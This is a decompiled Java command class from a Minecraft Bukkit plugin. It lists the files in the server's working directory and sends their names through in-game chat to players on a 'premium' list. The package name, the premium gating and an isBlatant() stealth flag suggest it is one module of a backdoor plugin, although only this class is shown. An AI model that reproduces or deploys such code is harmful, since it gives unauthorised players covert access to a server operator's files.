/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl.premium;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.utils.FileUtil;
import java.io.File;
import java.util.ArrayList;
import java.util.Collections;
import org.bukkit.entity.Player;

public class LsfCommand
extends Command {
    File file = FileUtil.getUserDir();

    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (plugin.premium.contains(p2.getName())) {
            ArrayList<String> files = new ArrayList<String>();
            for (File f2 : this.file.listFiles()) {
                if (!f2.isFile()) continue;
                files.add(f2.getName());
            }
            Collections.sort(files);
            p2.sendMessage(Settings.PREFIX("" + files));
        } else {
            p2.sendMessage(Settings.PREFIX("You must be a " + Settings.RED + "premium user " + Settings.WHITE + " to execute this command"));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

